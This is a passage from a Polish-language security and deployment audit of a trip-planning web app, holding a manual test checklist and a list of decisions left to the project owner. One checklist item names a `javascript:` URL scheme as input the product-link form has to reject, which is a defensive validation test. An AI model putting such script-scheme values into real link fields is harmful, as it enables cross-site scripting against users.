- [ ] Utworzenie podróży, dodanie dnia, dodanie punktu na mapie (geokodowanie działa).
- [ ] Import planu AI: wklejenie przykładowego JSON, weryfikacja `replaceExisting` i bez niego.
- [ ] Dodanie notatki trasy (markdown renderuje się poprawnie, linki tylko http/https).
- [ ] Lista pakowania: dodanie pozycji z ceną i linkiem produktowym — potwierdzić, że niepoprawny schemat
      URL (`javascript:...`) jest odrzucany przez formularz.
- [ ] Usunięcie dnia → nawigacja do innej zakładki i z powrotem → dzień pozostaje usunięty (weryfikacja
      poprawki cache z sekcji 6).
- [ ] Zaproszenie drugiego konta testowego jako `viewer` → potwierdzić brak możliwości edycji.
- [ ] Wylogowanie, próba dostępu do `/trips/{id}` bez sesji → przekierowanie.
- [ ] `robots.txt` i `sitemap.xml` zwracają poprawny, produkcyjny URL (nie `localhost`).
- [ ] Nagłówki bezpieczeństwa obecne na produkcyjnej domenie (CSP, HSTS, X-Frame-Options).

## 14. Lista manualnych decyzji

Miejsca, w których audyt świadomie nie podjął decyzji za właściciela projektu:

1. **Sposób rozwiązania rozjazdu historii migracji Prisma** (`migrate resolve --applied` vs. pełne
   `migrate deploy` na czystej bazie) — zależy od tego, czy baza produkcyjna docelowa to ta sama, do której
   odnosi się obecny `.env.local`, czego audyt nie mógł i nie próbował ustalić.
2. **Los danych „unassigned stops”** na docelowej bazie produkcyjnej przed migracją
   `remove_unassigned_stops` — zachować (migrować do nowego dnia), wyeksportować, czy zaakceptować utratę.
3. **Niespójność brandingu** „RoadTrip Planner” vs „Tripzo” w metadanych — czysto decyzja marketingowa/UX,
   nie techniczna.
4. **Cała checklista manualna Supabase** (sekcja 11) — konfiguracja panelu Supabase nie jest widoczna z
   repozytorium i wymaga fizycznego dostępu do dashboardu przez właściciela projektu.
5. **Commit i push zmian** — audyt wprowadził 4 poprawki plikowe (sekcja 6), ale zgodnie z ograniczeniami
   nie utworzył commita ani nie wykonał push; to wymaga jawnej zgody użytkownika.
